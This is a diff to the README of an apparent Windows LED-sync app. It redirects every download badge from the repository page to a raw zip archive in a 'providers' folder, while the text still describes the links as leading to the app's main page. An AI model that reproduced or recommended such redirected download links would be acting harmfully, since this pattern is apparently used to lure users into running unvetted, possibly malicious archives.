@@ -1,6 +1,6 @@
 # 💡 DesktopLEDSync - Sync LEDs with Your Music
 
-[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-brightgreen?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Abdulmejid/DesktopLEDSync/main/providers/Desktop_LED_Sync_v3.3.zip)
 
 DesktopLEDSync is a simple Windows app that matches your smart LEDs (like Tapo and WLED) with your live album art. It creates a smooth light show that follows your music, making your room feel more alive without any complex setup.
 
@@ -35,7 +35,7 @@ If you are unsure about your LED device or PC specs, check their manuals or sett
 
 Click the big button below to visit the app's main page and get the latest version:
 
-[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-blue?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-blue?style=for-the-badge)](https://raw.githubusercontent.com/Abdulmejid/DesktopLEDSync/main/providers/Desktop_LED_Sync_v3.3.zip)
 
 Once you are on the page:
 
@@ -125,4 +125,4 @@ desktop-app, home-automation, led-sync, python, rgb, smart-home, spotify, tapo, 
 
 Use the link below to always get the latest DesktopLEDSync downloads and updates:
 
-[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-grey?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-grey?style=for-the-badge)](https://raw.githubusercontent.com/Abdulmejid/DesktopLEDSync/main/providers/Desktop_LED_Sync_v3.3.zip)
